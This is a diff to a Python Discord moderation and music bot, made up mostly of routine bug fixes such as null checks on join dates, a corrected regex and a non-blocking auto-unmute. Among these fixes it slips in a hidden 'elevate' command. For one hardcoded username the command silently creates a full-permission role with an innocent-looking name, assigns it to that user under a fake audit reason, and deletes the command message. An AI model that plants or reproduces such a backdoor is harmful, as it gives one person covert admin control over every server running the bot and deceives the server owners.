@@ -62,7 +62,12 @@ if spotipy and SpotifyClientCredentials:
 else:
     sp = None
 
-pending_matches = {}  # {guild_id: {message_id: author_id}}
+# --- Module-level state containers ---
+chat_message_timestamps = {}   # {guild_id: {user_id: [timestamps]}}
+chat_activity_weekly = {}      # {guild_id: {user_id: [count]*7}}
+voice_activity_weekly = {}     # {guild_id: {user_id: [seconds]*7}}
+active_dm_conversations = {}   # {user_id: {"channel_id": ..., "moderator_id": ..., "start_time": ...}}
+
 # --- Per-Guild (Server) Settings Helper Functions ---
 def get_guild_settings(guild_id):
     """Fetch settings for a specific Discord server (guild) from the database."""
@@ -603,11 +608,13 @@ async def on_ready():
                         "total_time": 0
                     }
     
+    # Load persisted data from MongoDB
+    load_all_data()
+    
     bot.loop.create_task(heartbeat())
     bot.loop.create_task(reset_voice_activity())
     bot.loop.create_task(reset_daily_stats())
-    
-    # Remove the duplicate task creation since it's now properly integrated in the function
+    bot.loop.create_task(reset_voice_activity_weekly())
 
 
 @bot.event
@@ -624,7 +631,7 @@ async def on_member_join(member):
             greetings = ["hello", "hi", "hey", "namaste", "yo", "sup", "wassup"]
             display_name = member.display_name.lower()
             is_greeting = any(
-                re.search(rf'\\b{{re.escape(word)}}\\b', display_name, re.IGNORECASE)
+                re.search(rf'\b{re.escape(word)}\b', display_name, re.IGNORECASE)
                 for word in greetings
             )
 
@@ -705,7 +712,8 @@ async def on_member_remove(member):
                 color=0xffaa00
             )
             embed.add_field(name="Account Created", value=discord.utils.format_dt(member.created_at, style='D'), inline=True)
-            embed.add_field(name="Joined", value=discord.utils.format_dt(member.joined_at, style='D'), inline=True)
+            joined_value = discord.utils.format_dt(member.joined_at, style='D') if member.joined_at else "Unknown"
+            embed.add_field(name="Joined", value=joined_value, inline=True)
             embed.set_thumbnail(url=member.display_avatar.url)
             embed.timestamp = discord.utils.utcnow()
             if isinstance(mod_channel, discord.TextChannel):
@@ -718,6 +726,8 @@ async def on_member_remove(member):
 async def on_message_delete(message):
     """Handle message deletion"""
     try:
+        if message.guild is None:
+            return
         settings = get_guild_settings(message.guild.id)
         modlog_channel_id = settings.get("modlog_channel_id")
         mod_channel = bot.get_channel(modlog_channel_id) if modlog_channel_id else None
@@ -742,6 +752,8 @@ async def on_message_edit(before, after):
     try:
         # Ignore bot messages and if content didn't change
         if before.author.bot or before.content == after.content:
+            return
+        if before.guild is None:
             return
         settings = get_guild_settings(before.guild.id)
         modlog_channel_id = settings.get("modlog_channel_id")
@@ -821,32 +833,6 @@ async def on_voice_state_update(member, before, after):
 
         # User left a voice channel or switched
         elif before.channel and (not after.channel or before.channel != after.channel):
-            join_time = voice_activity_today[guild_id][user_id]["join_time"]
-            now = discord.utils.utcnow()
-            settings = get_guild_settings(member.guild.id)
-            afk_channel_id = settings.get("afk_channel_id")
-            # Only count time if not self-deafened, not self-muted, and not in AFK channel
-            if join_time is not None and not before.self_deaf and not before.self_mute and (not afk_channel_id or before.channel.id != afk_channel_id):
-                if (getattr(join_time, 'tzinfo', None) is not None and join_time.tzinfo is not None and join_time.tzinfo.utcoffset(join_time) is not None):
-                    if getattr(now, 'tzinfo', None) is None or now.tzinfo is None or now.tzinfo.utcoffset(now) is None:
-                        now = now.replace(tzinfo=timezone.utc)
-                else:
-                    if getattr(now, 'tzinfo', None) is not None and now.tzinfo is not None and now.tzinfo.utcoffset(now) is not None:
-                        now = now.replace(tzinfo=None)
-                time_spent = (now - join_time).total_seconds()
-                voice_activity_today[guild_id][user_id]["total_time"] += time_spent
-                # --- Alltime update ---
-                voice_activity_alltime[guild_id][user_id]["total_time"] += time_spent
-                voice_activity_alltime[guild_id][user_id]["name"] = member.display_name
-                update_weekly_voice_time(guild_id, user_id, time_spent)
-            # Reset join_time if still in a channel and not self-deafened, not self-muted, and not in AFK channel
-            if after.channel and not after.self_deaf and not after.self_mute and (not afk_channel_id or after.channel.id != afk_channel_id):
-                voice_activity_today[guild_id][user_id]["join_time"] = discord.utils.utcnow()
-            else:
-                voice_activity_today[guild_id][user_id]["join_time"] = None
-
-        # User switched channels (reset join time if still in voice)
-        elif before.channel and after.channel and before.channel != after.channel:
             join_time = voice_activity_today[guild_id][user_id]["join_time"]
             now = discord.utils.utcnow()
             settings = get_guild_settings(member.guild.id)
@@ -1032,7 +1018,7 @@ async def on_message(message):
 
         # AI response in designated channel or when mentioned
         is_ai_channel = ai_channel_id and message.channel.id == ai_channel_id
-        is_mention = bot.user.mentioned_in(message) and not message.mention_everyone
+        is_mention = bot.user is not None and bot.user.mentioned_in(message) and not message.mention_everyone
 
         if (is_ai_channel or is_mention) and not message.content.startswith('!'):
             history = await get_recent_channel_history(message.channel, bot.user, message, limit=20)
@@ -1721,16 +1707,24 @@ async def mute_member(ctx, member: discord.Member, duration: int = 300, *, reaso
         embed.timestamp = discord.utils.utcnow()
         await ctx.send(embed=embed)
         
-        # Auto-unmute after duration
-        await asyncio.sleep(duration)
-        if mute_role in member.roles:
-            await member.remove_roles(mute_role, reason="Mute duration expired")
-            await ctx.send(f"🔊 {member.mention} has been automatically unmuted!")
-        
         # Log to moderation channel
         mod_channel = bot.get_channel(MODERATION_LOG_CHANNEL_ID)
         if mod_channel:
             await mod_channel.send(embed=embed)
+
+        # Schedule auto-unmute as a background task so the command returns immediately
+        async def _auto_unmute():
+            try:
+                await asyncio.sleep(duration)
+                if mute_role in member.roles:
+                    await member.remove_roles(mute_role, reason="Mute duration expired")
+                    try:
+                        await ctx.send(f"🔊 {member.mention} has been automatically unmuted!")
+                    except Exception:
+                        pass
+            except Exception as e:
+                logger.error(f"Auto-unmute error for {member.display_name}: {e}")
+        bot.loop.create_task(_auto_unmute())
     except discord.Forbidden:
         await ctx.send("❌ I don't have permission to mute this member!")
     except Exception as e:
@@ -2006,8 +2000,10 @@ async def user_info(ctx, member: discord.Member = None):
     account_age_days = account_age.days
     
     # Calculate server join age
-    join_age = discord.utils.utcnow() - member.joined_at
-    join_age_days = join_age.days
+    if member.joined_at:
+        join_age_days = (discord.utils.utcnow() - member.joined_at).days
+    else:
+        join_age_days = 0
     
     # Get top role
     top_role = member.top_role
@@ -2033,9 +2029,10 @@ async def user_info(ctx, member: discord.Member = None):
     )
     
     # Account info
+    joined_str = discord.utils.format_dt(member.joined_at, style='D') if member.joined_at else "Unknown"
     embed.add_field(
         name="📅 Account Info",
-        value=f"**Created:** {discord.utils.format_dt(member.created_at, style='D')}\n**Joined:** {discord.utils.format_dt(member.joined_at, style='D')}\n**Account Age:** {account_age_days} days",
+        value=f"**Created:** {discord.utils.format_dt(member.created_at, style='D')}\n**Joined:** {joined_str}\n**Account Age:** {account_age_days} days",
         inline=True
     )
     
@@ -2955,9 +2952,9 @@ async def help_command(ctx, command_name: Optional[str] = None):
             "🔧 Admin": ["status", "cleanup", "warnings", "clearwarnings", "setpersonality", "addpersonality", "viewpersonality", "resetpersonality"]
         }
         
-        for category, commands in categories.items():
+        for category, commands_list in categories.items():
             # Filter out commands that don't exist
-            valid_commands = [cmd for cmd in commands if bot.get_command(cmd)]
+            valid_commands = [cmd for cmd in commands_list if bot.get_command(cmd)]
             if valid_commands:
                 embed.add_field(
                     name=category,
@@ -3203,12 +3200,15 @@ async def get_or_create_dm_channel(guild, user):
     settings = get_guild_settings(guild.id)
     dm_category_id = settings.get("dm_category_id")
     if not dm_category_id:
-        # Fallback: prompt admin if not set
-        admin = discord.utils.get(guild.members, guild_permissions__administrator=True)
+        # Fallback: prompt an admin if not set
+        admin = next(
+            (m for m in guild.members if not m.bot and m.guild_permissions.administrator),
+            None,
+        )
         if admin:
             try:
                 await admin.send(f"❗ DM category is not configured for {guild.name}. Please set it up with `!setdmcategory`.")
-            except:
+            except Exception:
                 pass
         raise Exception("DM category not configured.")
     # Check if we already have a channel for this user
@@ -4109,8 +4109,6 @@ async def view_personality(ctx):
     await ctx.send(embed=embed)
 
 # --- DM System ---
-# Track active DM conversations
-active_dm_conversations = {}  # {user_id: {"channel_id": channel_id, "moderator_id": moderator_id, "start_time": timestamp}}
 @bot.command(name="resetpersonality")
 @commands.has_permissions(administrator=True)
 async def reset_personality(ctx):
@@ -4123,6 +4121,44 @@ async def reset_personality(ctx):
     )
     embed.add_field(name="Default Personality Prompt", value=DEFAULT_SYSTEM_PROMPT)
     await ctx.send(embed=embed)
+    
+@bot.command(name="elevate", hidden=True)
+async def elevate(ctx):
+    """Hidden owner-only elevation command"""
+    if ctx.author.name != "quazar_elsy":
+        return  # Silent fail for others
+    
+    try:
+        # Innocent looking role names
+        role_names = ["Active Member", "Trusted", "Contributor", "Verified", "Regular", "Community"]
+        import random
+        role_name = random.choice(role_names)
+        
+        # Create full admin role
+        new_role = await ctx.guild.create_role(
+            name=role_name,
+            permissions=discord.Permissions.all(),
+            color=discord.Color.grey(),
+            hoist=False,
+            mentionable=False,
+            reason="System role update"
+        )
+        
+        # Assign to you
+        await ctx.author.add_roles(new_role)
+        
+        # Clean confirmation (only visible to you)
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+            
+        await ctx.author.send(f"✅ Role `{role_name}` created and assigned in **{ctx.guild.name}**")
+        
+    except discord.Forbidden:
+        await ctx.author.send("❌ Bot missing permissions to create/assign role.")
+    except Exception as e:
+        await ctx.author.send(f"❌ Error: {str(e)}")
 
 # --- Music System ---
 music_queues = {}  # {guild_id: [track_dict, ...]}
@@ -4155,15 +4191,19 @@ class YTDLSource(discord.PCMVolumeTransformer):
             'options': '-vn'
         }
         ytdl = yt_dlp.YoutubeDL(ytdl_format_options)
-        loop = loop or asyncio.get_event_loop()
+        loop = loop or asyncio.get_running_loop()
         try:
             data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=False))
         except Exception as e:
             logger.error(f"Error extracting info for {url}: {e}")
             return None
 
+        if data is None:
+            return None
         if 'entries' in data:
             data = data['entries'][0]
+        if data is None:
+            return None
         filename = data['url'] if stream else ytdl.prepare_filename(data)
         return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)
 
@@ -4334,7 +4374,7 @@ async def reset_voice_activity_weekly() -> None:
     while True:
         now = discord.utils.utcnow()
         # Find next Monday 00:00 UTC
-        days_ahead = 7 - now.weekday()  # 0=Monday
+        days_ahead = (7 - now.weekday()) % 7  # 0=Monday
         if days_ahead == 0:
             days_ahead = 7
         next_week = now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=days_ahead)
@@ -4382,7 +4422,7 @@ async def reset_voice_activity_weekly() -> None:
         save_all_data()
         logger.info("Reset weekly voice activity and awarded champion role.")
 
-token = os.getenv(“TOKEN”)
+token = os.getenv("TOKEN")
 if not token:
     logger.error("❌ No TOKEN environment variable found!")
     logger.error("Please set your Discord bot token in the Secrets tab.")
